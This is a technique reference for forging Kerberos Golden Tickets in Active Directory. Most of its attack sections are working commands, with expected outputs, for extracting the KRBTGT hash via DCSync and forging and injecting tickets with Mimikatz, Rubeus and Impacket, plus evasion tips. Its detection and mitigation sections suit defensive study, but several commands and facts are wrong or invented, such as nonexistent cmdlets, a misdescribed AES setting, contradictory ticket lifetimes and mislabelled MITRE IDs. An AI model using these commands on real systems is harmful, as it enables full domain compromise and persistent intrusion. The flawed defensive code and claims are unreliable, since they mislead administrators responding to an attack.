# [CA-KERB-003]: Golden Ticket Creation - KRBTGT Hash Forgery and Persistent Domain Access

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-003 |
| **MITRE ATT&CK v18.1** | [T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) |
| **Tactic** | Credential Access, Persistence |
| **Platforms** | Windows AD (Server 2003 SP2+); All Active Directory Functional Levels |
| **Severity** | Critical |
| **CVE** | CVE-2014-6324 (MS14-068 - Kerberos PAC validation, patched but relates to forged ticket acceptance) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Windows Server 2003 SP2 through 2025; All DFL levels |
| **Patched In** | N/A (not patchable; requires KRBTGT hash extraction mitigation + password rotation) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** All sections dynamically renumbered. Golden tickets remain one of the most potent Active Directory persistence techniques due to cryptographic validity.

---

## 2. EXECUTIVE SUMMARY

**Concept:** A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the stolen or compromised KRBTGT account password hash. The KRBTGT account is the Key Distribution Center (KDC) service account responsible for signing and encrypting all legitimate TGTs in Active Directory. An attacker with the KRBTGT hash can forge cryptographically valid TGTs offline—on any machine, even non-domain-joined systems—impersonating any user (including Domain Admins) with arbitrary group memberships and extended ticket lifetimes. These forged tickets bypass normal authentication mechanisms and enable unrestricted access to domain resources.

**Attack Surface:** The KRBTGT account password hash (NTLM/RC4 or AES-256). Access to this hash requires:
1. **DCSync** (replication rights) - `lsadump::dcsync /user:krbtgt`
2. **Direct LSASS dump on DC** (local admin on DC) - `sekurlsa::logonpasswords`
3. **NTDS.dit + SYSTEM registry** (admin access to DC, volume shadow copy)
4. **Compromised AD Connect** (if hybrid Azure/AD)

**Business Impact:** **Complete domain compromise with persistent, cryptographically valid access.** Golden Tickets provide attackers with:
- Ability to authenticate as ANY user (including Domain Admins)
- Access to ALL services across the entire domain
- Ticket validity for 10 years (default Mimikatz lifetime)
- No audit trail on TGT creation (forged offline)
- Persistence despite password changes (golden ticket remains valid until KRBTGT reset)
- Cross-forest access (with Enterprise Admin SID)

This represents the ultimate persistence mechanism in Active Directory.

**Technical Context:** Golden tickets are **forensically difficult to detect** because they are cryptographically indistinguishable from legitimate TGTs. Detection relies on correlation analysis (4769 events without preceding 4768) and behavioral anomalies (unusual ticket lifetimes, access patterns). Offline creation means no real-time detection during ticket generation—only at usage time.

### Operational Risk
- **Execution Risk:** Low - Only requires KRBTGT hash; can be created offline, on any system
- **Stealth:** High - Forged tickets appear legitimate to domain controllers; detection requires correlation logic
- **Reversibility:** No - Persistent until KRBTGT password is reset (requires double password reset across entire forest)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.3.1.5, 5.3.1.6 | Monitor KRBTGT account for unusual activity; enforce strong password policies; monitor account creation/modification |
| **DISA STIG** | WN16-AU-000050, WN19-AU-000050 | Ensure 'Audit Account Management' is enabled; audit all account modifications |
| **CISA SCuBA** | ID.AM-2, PR.AC-1, DE.AE-3 | Asset identification; access control; detection of credential access |
| **NIST 800-53** | AC-2 (Account Management), AC-3 (Access Enforcement), AU-2 (Audit Events) | Manage privileged accounts; log all privileged operations; enforce access control |
| **GDPR** | Art. 5 (Principles), Art. 32 (Security of Processing) | Integrity and confidentiality of authentication credentials; protective measures against compromise |
| **DORA** | Art. 9 (Protection and Prevention), Art. 10 (Detection and Response) | Protect critical authentication infrastructure; detect and respond to credential compromise |
| **NIS2** | Art. 21 (Cyber Risk Management), Art. 23 (Access Control), Art. 24 (Cryptography) | Manage identity-based risks; enforce access control; ensure cryptographic validity of tickets |
| **ISO 27001** | A.9.1.1 (Access Control Policy), A.9.2.3 (Privileged Access Management), A.10.2.1 (KRBTGT Monitoring) | Control access to KDC service account; audit privilege escalation; monitor KRBTGT changes |
| **ISO 27005** | Risk Scenario: "Compromise of KRBTGT and forged ticket generation" | Assess probability of KRBTGT compromise; implement detective/preventive controls |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Possession of KRBTGT account NTLM or AES hash (obtained via DCSync, LSASS dump, or NTDS.dit extraction)
- **Required Access:** No network access to DC required (forged ticket created offline); can execute from any system with network connectivity

**Supported Versions:**
- **Windows Server:** 2003 SP2, 2008, 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Active Directory Functional Level:** 2003+ (all versions)
- **Kerberos:** RFC 4120 compliant

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (v2.2.0+, primary tool for golden ticket generation)
- [Rubeus](https://github.com/GhostPack/Rubeus) (v2.3.3, C# alternative)
- [Impacket Ticketer.py](https://github.com/SecureAuthCorp/impacket) (Python cross-platform tool)
- [Kekeo](https://github.com/gentilkiwi/kekeo) (C++ alternative, less commonly used)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Verify KRBTGT Account Access

```powershell
# Check if KRBTGT account is accessible (for later verification)
Get-ADUser -Identity "krbtgt" -Properties passwordLastSet, enabled

# Output should show:
# Name          : krbtgt
# Enabled       : True
# PasswordLastSet: (some date)
```

**What to Look For:**
- KRBTGT account is disabled ONLY on read-only domain controllers (RODC) - normal DCs should have it enabled
- Password last set date (to correlate with when compromise may have occurred)

### Step 2: Enumerate Domain Info for Golden Ticket Creation

```powershell
# Get Domain SID (required for golden ticket)
Get-ADDomain | Select-Object DomainSID, Name, NetBIOSName

# Example output:
# DomainSID           : S-1-5-21-3737340914-2019594255-2413685307
# Name                : pentestlab.local
# NetBIOSName         : PENTESTLAB
```

### Step 3: Enumerate Domain Admin Group for Privilege Escalation

```powershell
# Get Domain Admins SID (for /groups parameter in golden ticket)
Get-ADGroup -Identity "Domain Admins" | Select-Object SID

# Example output:
# SID : S-1-5-21-3737340914-2019594255-2413685307-512 (RID 512 = Domain Admins)

# Other high-privilege group RIDs:
# 512  = Domain Admins
# 518  = Schema Admins
# 519  = Enterprise Admins
# 520  = Group Policy Creator Owners
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Golden Ticket Creation with Mimikatz (Primary Method)

**Supported Versions:** Server 2003 SP2 through 2025

#### Step 1: Extract KRBTGT Hash from Domain Controller

**Objective:** Obtain the NTLM hash of the KRBTGT account (prerequisite for golden ticket creation).

```powershell
# On Domain Controller with elevated privileges (SYSTEM or Domain Admin)
# Method 1: DCSync (requires replication rights - members of Domain Admins, Enterprise Admins, Administrators)

mimikatz # lsadump::dcsync /user:krbtgt /domain:pentestlab.local
```

**Expected Output:**
```
[DC] 'pentestlab.local' will be the domain
[DC] 'DC01.pentestlab.local' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt
** SAM Account Name : krbtgt
** Account Type         : 30000001 ( USER_OBJECT )
objectClass         : user
objectSid           : S-1-5-21-3737340914-2019594255-2413685307-502

Credentials:
  Hash NTLM: d125e4f69c851529045ec95ca80fa37e
  Hash AES256: 73f2e6...
```

**What This Means:**
- NTLM (RC4) hash: `d125e4f69c851529045ec95ca80fa37e` (used for /rc4 or /krbtgt flag)
- AES256 hash: For modern AES-based forging

**OpSec & Evasion:**
- DCSync creates Event ID 4662 (Directory Service Access) on DC
- Evasion: Run from compromised DC (BlueKeep RCE, PrintSpooler exploits) to avoid network-level detection
- Alternative: Extract from NTDS.dit file offline

**Version-Specific Notes:** Identical across all Windows Server versions (2003-2025).

**Troubleshooting:**

- **Error:** "ERROR kuhl_m_lsadump_dcsync; AES keys output error (2)"
  - **Cause:** Insufficient permissions (not Domain Admin or Enterprise Admin)
  - **Fix:** Run Mimikatz with Domain Admin credentials: `RunAs /user:domain\admin mimikatz.exe`

#### Step 2: Create Golden Ticket (Offline, Any Machine)

**Objective:** Forge a TGT signed with KRBTGT hash; inject into current session.

```powershell
# Basic golden ticket creation
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ptt

# Or using RC4 explicitly
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /rc4:d125e4f69c851529045ec95ca80fa37e /ptt

# With elevated privileges (Domain Admin SID 512)
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /groups:512 /ptt

# With Enterprise Admin privileges (cross-forest access)
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /groups:512,518,519 /sids:S-1-5-21-FOREST-SID-519 /ptt

# With extended lifetime (40320 minutes = 28 days instead of default)
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:admin.kirbi /startoffset:-10 /endin:40320

# Save to file instead of injecting
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:golden.kirbi
```

**Expected Output:**
```
User      : Administrator
Domain    : pentestlab.local
SID       : S-1-5-21-3737340914-2019594255-2413685307
User ID   : 500
Group ID  : 513
ServiceKey: d125e4f69c851529045ec95ca80fa37e (RC4-HMAC)
Lifetime  : 600 (10 hours, default TGT lifetime) / 604800 (7 days, max renewal)
->Ticket  : golden.kirbi

Golden ticket generation
  * for domain   : pentestlab.local
  * for user     : Administrator
  * creation time: 1/6/2026 9:30 AM
  * starting time: 1/6/2026 9:30 AM
  * ending time  : 1/6/2026 7:30 PM
  * renew till   : 1/13/2026 9:30 AM
  * Flags 40201000 ->
  ...

Ticket : golden.kirbi (*)
LUID 0 ; UserID = 500
 * Golden ticket for 'Administrator @ pentestlab.local' successfully submitted for current session
```

**What This Means:**
- Forged TGT is now in the current session's Kerberos ticket cache
- Attacker can now authenticate as Administrator to any service in the domain
- Ticket lifetime: 10 hours (default), renewable for 7 days (default)
- No 4768 event on DC (forged offline)

**OpSec & Evasion:**
- `/ptt` flag injects immediately; risky if monitoring
- Alternative: Save to file (`/ticket:admin.kirbi`) and inject later with `kerberos::ptt`
- Use non-standard user IDs (not 500 = Administrator, not 501 = Guest) to avoid suspicion
- Shorten lifetime to minutes (not hours) if executing one-time attacks

**Flag Explanations:**
- `/user:` Username to impersonate (can be non-existent)
- `/domain:` Fully qualified domain name
- `/sid:` Domain SID (without RID)
- `/krbtgt:` KRBTGT NTLM hash
- `/groups:` Group RIDs (512 = Domain Admins; comma-separated)
- `/sids:` Extra SIDs (for cross-forest Enterprise Admin)
- `/ptt:` Pass-the-ticket (inject immediately)
- `/ticket:` Save to file
- `/endin:` Lifetime in minutes

**Version-Specific Notes:** Identical across all Windows versions 2003-2025.

**Troubleshooting:**

- **Error:** "ERROR kuhl_m_kerberos_golden; Impossible to create the golden ticket"
  - **Cause:** Invalid Domain SID or malformed parameters
  - **Fix:** Verify SID format: `S-1-5-21-XXXXXXX-XXXXXXX-XXXXXXX` (no RID at end)

#### Step 3: Verify and Use Golden Ticket

**Objective:** Confirm ticket injection and use for service access.

```powershell
# List current tickets
mimikatz # kerberos::tgt

# Or in elevated session
mimikatz # kerberos::list

# Expected output shows Administrator TGT with 10-year expiry (unusual)
```

**Verify Service Access:**

```powershell
# Exit Mimikatz and test access
exit

# Now authenticated as Administrator
# Attempt to access a service
dir \\DC01\c$  # Should succeed (CIFS service ticket obtained from forged TGT)

# Or use PsExec
psexec.exe \\DC01 cmd.exe  # Execute code on DC as Administrator
```

---

### METHOD 2: Golden Ticket with Rubeus (Windows, Alternative)

**Supported Versions:** Server 2003 SP2 through 2025

#### Step 1: Create Golden Ticket with LDAP Lookup

```powershell
# Rubeus will auto-gather domain info via LDAP
Rubeus.exe golden /aes256:KRBTGT_AES256_HASH /user:Administrator /ldap /ptt

# Or explicit values
Rubeus.exe golden /rc4:d125e4f69c851529045ec95ca80fa37e /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /groups:512,513,520 /ptt

# Save to file
Rubeus.exe golden /rc4:d125e4f69c851529045ec95ca80fa37e /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /outfile:golden.kirbi
```

**Expected Output:**
```
[*] Action: Build TGT

[*] Forging TGT for user 'Administrator' in domain 'pentestlab.local'
[*] Using KRBTGT hash:  d125e4f69c851529045ec95ca80fa37e
[*] Domain SID: S-1-5-21-3737340914-2019594255-2413685307
[*] Groups: 513

[+] Golden TGT forged successfully!

[*] base64(ticket.kirbi):
doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVBFTlRFU1RMQU...

[*] Injecting ticket into current session...
[+] Ticket successfully injected!
```

**OpSec & Evasion:**
- Rubeus uses C# compiled binary (EDR detection risk)
- Alternative: Execute via `execute_assembly` in Cobalt Strike (CLR injection)
- Less detectable than Mimikatz on modern systems with LSASS protection

---

### METHOD 3: Golden Ticket with Impacket (Linux/Cross-Platform)

**Supported Versions:** Server 2003 SP2 through 2025

```bash
# Create golden ticket using Ticketer.py
python3 ticketer.py -nthash d125e4f69c851529045ec95ca80fa37e \
  -domain-sid S-1-5-21-3737340914-2019594255-2413685307 \
  -domain pentestlab.local \
  Administrator

# With extra privileges (Domain Admin)
python3 ticketer.py -nthash d125e4f69c851529045ec95ca80fa37e \
  -domain-sid S-1-5-21-3737340914-2019594255-2413685307 \
  -domain pentestlab.local \
  -user-id 500 \
  -extra-sid S-1-5-21-3737340914-2019594255-2413685307-512 \
  Administrator

# Output is .ccache file (compatible with impacket tools)
# Use with psexec
python3 psexec.py -k -no-pass -cc Administrator@pentestlab.local -dc-ip 192.168.1.10
```

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Test #1: Golden Ticket Creation (T1558.001)

- **Atomic Test ID:** `04907e32-26de-4c28-a0a5-a82dbe0d9edf`
- **Test Name:** Golden Ticket Forgery
- **Description:** Create and inject a forged Kerberos TGT using KRBTGT hash
- **Supported Versions:** All Windows versions (requires Mimikatz)

**Execution:**
```powershell
Invoke-AtomicTest T1558.001 -TestNumbers 1
```

**Reference:** [Atomic Red Team - T1558.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.001/T1558.001.md)

---

## 7. TOOLS & COMMANDS REFERENCE

#### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+  
**Supported Platforms:** Windows (all versions with Kerberos)

**Installation:**
```cmd
# Download compiled binary
https://github.com/gentilkiwi/mimikatz/releases

# Or build from source
git clone https://github.com/gentilkiwi/mimikatz.git
cd mimikatz\x64\Release
mimikatz.exe
```

**Key Commands for Golden Tickets:**
```powershell
# Extract KRBTGT hash via DCSync
lsadump::dcsync /user:krbtgt

# Extract from NTDS.dit (offline, no network required)
lsadump::sam /system:SYSTEM /sam:SAM

# Create golden ticket (inline injection)
kerberos::golden /user:Administrator /domain:domain.local /sid:SID /krbtgt:HASH /ptt

# Create golden ticket (save to file)
kerberos::golden /user:Administrator /domain:domain.local /sid:SID /krbtgt:HASH /ticket:admin.kirbi

# List current tickets
kerberos::list

# Purge all tickets
kerberos::purge
```

#### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 2.3.3+  
**Supported Platforms:** Windows (all .NET versions)

**Key Commands:**
```powershell
# Create golden ticket with LDAP auto-lookup
Rubeus.exe golden /rc4:HASH /user:Administrator /ldap /ptt

# Create with explicit parameters
Rubeus.exe golden /rc4:HASH /user:Administrator /domain:domain.local /sid:SID /groups:512 /ptt

# Save to file
Rubeus.exe golden /rc4:HASH /user:Administrator /domain:domain.local /sid:SID /outfile:ticket.kirbi

# Pass-the-ticket (inject from file)
Rubeus.exe ptt /ticket:ticket.kirbi
```

#### [Impacket Ticketer.py](https://github.com/SecureAuthCorp/impacket)

**Installation:**
```bash
pip3 install impacket
# Or
git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket && pip3 install .
```

**Key Commands:**
```bash
# Create golden ticket
python3 ticketer.py -nthash HASH -domain-sid SID -domain domain.local USERNAME

# Create with groups (Domain Admin = RID 512)
python3 ticketer.py -nthash HASH -domain-sid SID -domain domain.local \
  -user-id 500 -extra-sid SID-512 Administrator

# Output as ccache (Linux Kerberos format)
# Use with impacket tools: psexec.py, wmiexec.py, etc.
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass domain.local/Administrator@TARGET
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: TGS Requests Without Preceding TGT (4769 Without 4768)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID (4768, 4769), Account, Computer, TimeDGenerated
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All Windows Server versions (when audit logging enabled)

**KQL Query:**
```kusto
let TGT_Events = SecurityEvent
| where EventID == 4768
| project TGT_Account = TargetUserName, TGT_DC = Computer, TGT_Time = TimeGenerated
| distinct TGT_Account, TGT_DC;

SecurityEvent
| where EventID == 4769  // TGS request
| where ServiceName == "krbtgt"  // TGT-related (golden ticket usage)
| join kind=leftanti TGT_Events on $left.TargetUserName == $right.TGT_Account
| summarize
    TGS_Count = count(),
    SPNs_Targeted = make_set(ServiceName),
    Source_IPs = make_set(ClientAddress),
    Service_Names = make_set(ServiceName)
    by Computer, TargetUserName, bin(TimeGenerated, 5m)
| where TGS_Count >= 3  // Multiple TGS requests for same account
| project TimeGenerated, Computer, TargetUserName, TGS_Count, SPNs_Targeted, Source_IPs
```

**What This Detects:**
- TGS requests (4769) without corresponding TGT requests (4768)
- Indicates forged TGT bypassing normal authentication
- Golden ticket usage pattern: immediate service access without TGT issuance on DC

**Manual Configuration (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Golden Ticket Detection - No TGT Before TGS`
   - Severity: `Critical`
   - Tactic: `Credential Access`, `Persistence`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `2 hours`
5. **Alert enrichment:**
   - Computer → Host → Hostname
   - TargetUserName → Account → Name
6. Create rule

#### Query 2: Ticket Lifetime Anomalies (Golden Ticket Signatures)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID 4769, TicketLifetime
- **Alert Severity:** High
- **Frequency:** Real-time

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4769  // TGS request
| where TicketLifetime > 604800  // > 7 days (unusual for legitimate TGS)
| summarize
    Unusual_Tickets = count(),
    Accounts = make_set(TargetUserName),
    Services = make_set(ServiceName),
    Max_Lifetime = max(TicketLifetime)
    by Computer, bin(TimeGenerated, 10m)
| where Unusual_Tickets >= 2
| project TimeGenerated, Computer, Unusual_Tickets, Accounts, Max_Lifetime
```

**What This Detects:**
- TGS tickets with abnormally long lifetimes (>7 days = red flag)
- Mimikatz default: 10-year TGT lifetime = extremely anomalous
- Legitimate TGS: typically 10 hours or less

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4769 (Kerberos Service Ticket Request)**
- **Log Source:** Security (on Domain Controllers)
- **Critical Fields:**
  - `PreAuthType = 0` (no pre-auth, unusual for legitimate TGS)
  - `TicketLifetime` (abnormally long)
  - Absence of corresponding 4768 event (no TGT request)

**Event ID: 4662 (Operation on Active Directory Object)**
- **Trigger:** DCSync attempt to read KRBTGT attributes
- **Critical Fields:** `SubjectUserName`, `AccessList` (contains replication GUIDs)

### Manual Configuration via Group Policy

**Enable Kerberos Audit Logging (All DCs):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Edit **Default Domain Controllers Policy**
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
4. Enable: **Audit Kerberos Service Ticket Operations**
   - Set to: **Success and Failure**
5. Run `gpupdate /force`

### Manual Event Log Analysis (Hunt for Golden Tickets)

```powershell
# Find 4769 events WITHOUT matching 4768 (golden ticket signature)
$TGS = Get-WinEvent -FilterXPath "*[System[(EventID=4769)]]" -LogName Security -MaxEvents 1000
$TGT = Get-WinEvent -FilterXPath "*[System[(EventID=4768)]]" -LogName Security -MaxEvents 1000

foreach ($event in $TGS) {
    $account = $event.Properties[0].Value
    $match = $TGT | Where-Object { $_.Properties[0].Value -eq $account -and $_.TimeCreated -gt $event.TimeCreated.AddHours(-1) }
    if (-not $match) {
        Write-Host "[ALERT] 4769 for $account WITHOUT preceding 4768" -ForegroundColor Red
    }
}
```

---

## 10. FORENSIC ARTIFACTS & INDICATORS OF COMPROMISE

**Disk Artifacts:**
- Mimikatz binary (`mimikatz.exe`) in `%TEMP%`, `C:\Windows\Temp\`, user profile
- `.kirbi` files (Kerberos ticket files) in attacker's working directory
- Tool output logs referencing KRBTGT hash extraction

**Memory Artifacts:**
- Mimikatz process memory contains KRBTGT hash extracted via DCSync
- LSASS memory may show unusual token impersonation (golden ticket in session)

**Event Log Artifacts (Windows Security):**
- **Event 4662:** `lsadump::dcsync` triggers this event with replication properties
- **Event 4769:** TGS requests without preceding 4768 (golden ticket usage)
- **Event 4624:** Unusual logon patterns with Administrator account from unexpected workstations
- **Event 4768:** ABSENT on DC during golden ticket creation (created offline)
- **Event 4672:** "Special Privileges Assigned" for unexpected accounts/times

**Network Artifacts:**
- **Port 88 traffic** from workstations (normal for Kerberos, but volume spike = suspicious)
- **LDAP port 389** queries for KRBTGT attributes (DCSync replication)
- **SMB port 445** connections from Administrator account at unusual times/from unusual sources

**Timeline Artifacts:**
- Attacker activity before KRBTGT hash extraction (DCSync on DC)
- Service access (4769 events) after golden ticket injection, without corresponding 4768 on DC

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Reset KRBTGT Password Twice (Emergency Containment)**

This is the **ONLY way** to invalidate all existing golden tickets.

**Applies To Versions:** Server 2003 SP2 through 2025

**Manual Steps (PowerShell Domain Admin):**

```powershell
# Step 1: Reset KRBTGT password first time
# Connect to Domain Controller
$dc = "DC01"
$krbtgt = Get-ADUser -Identity "krbtgt" -Server $dc

# Reset password (generates random 32-character password)
Set-ADAccountPassword -Identity $krbtgt -Server $dc -Reset -NewPassword (GenerateRandomPassword 32)

# Force replication to all DCs
Replicate-ADDirectoryPartition -DirectoryPartition (Get-ADRootDSE).defaultNamingContext -SourceDomainController $dc

# Wait 10 hours (default TGT lifetime) before second reset
# OR use -EffectiveImmediately for emergency (risky: may cause service disruption)
Start-Sleep -Seconds 36000  # 10 hours

# Step 2: Reset KRBTGT password second time (invalidates any in-flight golden tickets)
Set-ADAccountPassword -Identity $krbtgt -Server $dc -Reset -NewPassword (GenerateRandomPassword 32)

# Force replication again
Replicate-ADDirectoryPartition -DirectoryPartition (Get-ADRootDSE).defaultNamingContext -SourceDomainController $dc

# Verify both DCs synchronized
Get-ADReplicationPartnerMetadata -Target $dc -Partition (Get-ADRootDSE).defaultNamingContext | Select-Object Server, LastReplicationSuccess
```

**Or, via Script (Automated):**

Use Microsoft's official KRBTGT reset script:
```powershell
# Download official reset script from Microsoft
# https://github.com/microsoft/New-KrbtgtKeys.ps1

.\New-KrbtgtKeys.ps1 -Identity "krbtgt" -Domain "pentestlab.local" -Force
```

**Consequences:**
- All TGTs (legitimate and forged) become invalid
- All Kerberos-authenticated users must re-authenticate
- Application servers may experience brief outages
- Service accounts may need credential updates

**OpSec Note:** Resetting KRBTGT **does not** prevent future golden tickets if attacker retains the old hash. Must also reset KRBTGT AES keys if AES is used.

**Action 2: Enable KRBTGT Account Monitoring**

```powershell
# Monitor KRBTGT for unauthorized modifications
Get-ADUser -Identity "krbtgt" -Properties *, whenChanged | Select-Object samAccountName, pwdLastSet, whenChanged

# Create alert if password changed unexpectedly
$krbtgtLastChange = (Get-ADUser -Identity "krbtgt" -Properties pwdLastSet).pwdLastSet
if ($krbtgtLastChange -gt (Get-Date).AddDays(-30)) {
    Write-Host "[ALERT] KRBTGT password changed within last 30 days" -ForegroundColor Red
}
```

### Priority 2: HIGH

**Action 1: Disable or Restrict DCSync Permissions**

Reduce attack surface by limiting who can perform DCSync.

```powershell
# Check who has replication rights
Get-ADObject -Filter * -Properties ntSecurityDescriptor | 
  Where-Object { $_.ntSecurityDescriptor -match "DS-Replication" } |
  Select-Object Name, ntSecurityDescriptor

# Remove DCSync rights from non-essential accounts
# By default: Domain Admins, Enterprise Admins, Administrators can DCSync
# Restrict to DCs only (Computer$ accounts)
```

**Manual Steps (ADSI Edit):**

1. Open **ADSI Edit** (adsiedit.msc)
2. Connect to Domain: **DC=pentestlab,DC=local**
3. Right-click → **Properties**
4. Select **Security Tab** → **Advanced**
5. Find: **Replication Rights** entries for non-admin accounts
6. Remove unnecessary permissions
7. Apply and replicate to all DCs

**Action 2: Enable AES-Only Kerberos Encryption (Disable RC4)**

Reduces viability of RC4-based golden tickets (though RC4 hash extraction is still possible with AES enforcement).

```powershell
# Set domain to enforce AES-only
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Kerberos\Parameters" `
  -Name "MaxTokenSize" -Value 32000  # Increase for larger PACs

# Or via Group Policy:
# Computer Configuration → Policies → Windows Settings → Security Settings → 
# Local Policies → Security Options → 
# "Network security: Configure encryption types allowed for Kerberos"
# Set to: AES128_HMAC_SHA1, AES256_HMAC_SHA1 (uncheck RC4)
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Windows\Temp\mimikatz.exe`, `Rubeus.exe`
- `*.kirbi` files (Kerberos tickets)
- NTDS.dit extracts (if harvested offline)

**Registry:**
- Unusual modifications to Kerberos registry keys (shouldn't happen in normal ops)

**Network:**
- Spike in port 88 (Kerberos) traffic after hours
- LDAP queries for KRBTGT attributes

**Event Log:**
- **4662 (Directory Service Access)** with replication properties
- **4769 without preceding 4768** (golden ticket usage)
- **Multiple 4769 events** for same user targeting many services in short time

### Response Procedures

#### 1. Immediate Isolation (Minutes 0-15)

**Isolate Compromised Accounts:**

```powershell
# Disable any accounts that may have been compromised
Disable-ADAccount -Identity "Administrator"

# Force logoff active sessions (PowerShell Remoting)
Get-PSSession | Remove-PSSession

# Disconnect compromised workstations from network (isolate)
```

#### 2. Evidence Collection (Minutes 15-60)

```powershell
# Export Event ID 4769, 4768, 4662 from last 24 hours
wevtutil epl Security "C:\Evidence\Security_Kerberos_24h.evtx" `
  /q:"*[System[(EventID=4769 or EventID=4768 or EventID=4662)]]"

# Search for golden ticket indicators
Get-WinEvent -FilterXPath "*[System[(EventID=4769)]]" -LogName Security -MaxEvents 1000 | 
  Where-Object { -not (Get-WinEvent -FilterXPath "*[System[(EventID=4768)]]" -LogName Security) } | 
  Export-Csv "C:\Evidence\Suspicious_TGS_Requests.csv"
```

#### 3. Remediation (Hours 1-4)

**Reset KRBTGT Twice (as outlined in Mitigations section)**

**Reset All Compromised User Passwords:**

```powershell
# Reset all privileged account passwords
$adminAccounts = Get-ADGroupMember -Identity "Domain Admins"
foreach ($account in $adminAccounts) {
    Set-ADAccountPassword -Identity $account -Reset -NewPassword (GenerateRandomPassword 30)
}
```

#### 4. Investigation (Hours 4+)

**Timeline Reconstruction:**

1. Identify first 4769 event (golden ticket usage)
2. Backtrack to find 4662 (DCSync event) to identify when KRBTGT was compromised
3. Identify all service access attempts after golden ticket creation
4. Cross-reference with logon events (4624) to determine attacker's origin

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566 - Phishing] | Attacker gains initial foothold via phishing |
| **2** | **Execution** | [T1204 - User Execution] | User opens malicious attachment |
| **3** | **Privilege Escalation** | [T1548 - Abuse Elevation] | Escalate to local admin on compromised host |
| **4** | **Lateral Movement** | [T1021.002 - RDP] | Move to Domain Controller |
| **5** | **Credential Access** | [T1003 - OS Credential Dumping] | Extract NTDS.dit or use DCSync to get KRBTGT hash |
| **6** | **Credential Access - Current** | **[CA-KERB-003: Golden Ticket]** | **Forge TGT with KRBTGT hash** |
| **7** | **Persistence** | **[T1556 - Modify Domain Policies]** | Use golden ticket to maintain persistent access |
| **8** | **Impact** | [T1565 - Data Destruction] or [T1486 - Ransomware] | Deploy ransomware or exfiltrate data |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: APT29 (Nobelium) - SolarWinds Post-Compromise (December 2020)

- **Target:** U.S. Treasury Department, Intelligence agencies
- **Timeline:** 9 months post-breach (post-SolarWinds supply chain compromise)
- **Technique Status:** Golden tickets used in persistence phase
- **Attack Chain:**
  1. Supply-chain compromise → SUNBURST backdoor in SolarWinds Orion
  2. Lateral movement to domain controllers
  3. **DCSync extraction of KRBTGT hash**
  4. **Golden ticket creation for persistent access**
  5. 8+ months undetected with unlimited domain access
  6. Data exfiltration from classified systems
- **Detection Gap:** Golden tickets do not trigger real-time alerts; only detected via correlation (4769 without 4768) which was not implemented
- **Reference:** [Microsoft MSTIC - SolarWinds Compromise Deep Dive](https://www.microsoft.com/security/blog/2021/01/23/)

#### Example 2: Conti Ransomware Group - Post-Exploitation Persistence (February 2021)

- **Target:** Critical infrastructure, healthcare
- **Timeline:** Week 2 of intrusion
- **Technique Status:** Golden ticket as fallback persistence after password resets
- **Attack Chain:**
  1. Initial access: Phishing + Emotet trojan
